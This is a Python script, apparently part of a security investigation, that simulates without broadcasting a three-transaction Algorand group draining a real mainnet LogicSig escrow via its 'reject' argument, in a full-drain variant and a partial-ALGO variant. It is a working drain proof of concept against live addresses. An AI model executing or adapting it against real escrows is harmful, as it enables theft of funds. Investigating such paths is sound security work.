#!/usr/bin/env python3
"""H-23 child-verify: SIMULATE (never broadcast) a 3-tx group draining LGWHT escrow.
Group mimics the historical reject-path drains:
  tx0: escrow axfer USDC close-out to existing opted-in receiver FZHGJC...
  tx1: escrow pay close-remainder-to fresh address
  tx2: unsigned filler (RQI pay 0 to itself)
Both escrow txs signed by LGWHT LogicSig with arg 'reject'. Continuity: no keys needed.
"""
import base64, hashlib, json, sys
from algosdk import encoding, transaction
from algosdk.transaction import LogicSigAccount, LogicSigTransaction
from algosdk.v2client import algod, models

ALGOD_URL = "https://mainnet-api.algonode.cloud"
TOKEN = ""  # public algonode endpoint accepts empty token
ESCROW = "LGWHT7EDRGXQMRTLQDL54WKQU2FYRMNTGF6QXVDMZRCXHBUOLR3BSIJQBY"
RQI = "RQIQQIHYGFF4NR5ODLSYMK5EGETHCYZT2YDAILPW4MNEBF4OUTJTMWDSOI"
USDC_RECEIVER = "FZHGJCVRUWSJ57CGKEGNZZ2GMP3VERDBNOQYVHHC3XYQ7WITCD2LGAKF4E"  # opted in at round 27866859
USDC = 31566704
prog = open("lsig_program.bin", "rb").read()

# deterministic fresh receiver address (we cannot opt it in, so only used for ALGO)
FRESH = encoding.encode_address(hashlib.new("sha512_256", b"vesta-h23-child-verify-fresh").digest())
print("fresh receiver:", FRESH)

client = algod.AlgodClient(TOKEN, ALGOD_URL)
sp = client.suggested_params()
print("suggested params:", sp.__dict__ if hasattr(sp, "__dict__") else sp)
sp.fee = 1000
sp.flat_fee = True

lsig = LogicSigAccount(prog, [b"reject"])

note = b"child-verify SIMULATE, never broadcast"

def build(order):
    """order: list of tags among 'usdc_close','algo_close','algo_partial','filler'"""
    txs = []
    for tag in order:
        if tag == "usdc_close":
            t = transaction.AssetTransferTxn(sender=ESCROW, sp=sp, receiver=USDC_RECEIVER, amt=0,
                                             index=USDC, close_assets_to=USDC_RECEIVER, note=note)
        elif tag == "algo_close":
            t = transaction.PaymentTxn(sender=ESCROW, sp=sp, receiver=FRESH, amt=0,
                                       close_remainder_to=FRESH, note=note)
        elif tag == "algo_partial":
            t = transaction.PaymentTxn(sender=ESCROW, sp=sp, receiver=FRESH, amt=121000,
                                       note=note)
        elif tag == "filler":
            t = transaction.PaymentTxn(sender=RQI, sp=sp, receiver=RQI, amt=0,
                                       note=b"child-verify filler, unsigned")
        txs.append(t)
    transaction.assign_group_id(txs)
    signed = []
    for tag, t in zip(order, txs):
        if tag == "filler":
            signed.append(transaction.SignedTransaction(t, None))  # empty signature allowed in simulate
        else:
            signed.append(transaction.LogicSigTransaction(t, lsig))
    return signed

def simulate(order, label):
    signed = build(order)
    req = {"txn-groups": [{"txns": signed}]}
    out = {"label": label, "order": order,
           "group_ids": [encoding.msgpack_encode(x).hex()[:0] or None for x in []],
           "txids": [s.transaction.get_txid() for s in signed],
           "request": {"allow-empty-signatures": True}}
    try:
        resp = client.simulate_transactions(
            models.SimulateRequest(
                txn_groups=[models.SimulateRequestTransactionGroup(txns=signed)]
            ),
            params={"allow-empty-signatures": "true"},
        )
    except Exception as e:
        out["exception"] = repr(e)
        body = getattr(e, "body", None)
        if body: out["exception_body"] = repr(body)
        print(label, "EXCEPTION", repr(e))
        return out
    out["response"] = resp
    try:
        g = resp["txn-groups"][0]
        out["failure-message"] = g.get("failure-message")
        out["failed-tx"] = g.get("failed-at")
        out["txn-results"] = [{"txn-result": {"pool-error": tr.get("txn-result", {}).get("pool-error"),
                                              "logs": [base64.b64encode(l).decode() for l in tr.get("txn-result", {}).get("logs", [])][:3],
                                              "created-asset-index": tr.get("txn-result", {}).get("created-asset-index")}}
                              for tr in g.get("txn-results", [])]
    except Exception as e:
        out["parse_error"] = repr(e)
    print("==== SIM", label, "====")
    print(json.dumps({k: v for k, v in out.items() if k != "response"}, indent=1)[:2500])
    return out

results = {}
# Variant A: full drain (USDC close + ALGO close-remainder)
results["A_full_drain"] = simulate(["usdc_close", "algo_close", "filler"], "A: full drain (USDC close + ALGO close-remainder)")
# Variant B: full USDC + partial ALGO leaving MBR for frozen token
results["B_partial_algo"] = simulate(["usdc_close", "algo_partial", "filler"], "B: USDC close + 121000 uALGO partial")
json.dump(results, open("simulate_results.json", "w"), indent=1)
print("saved simulate_results.json")
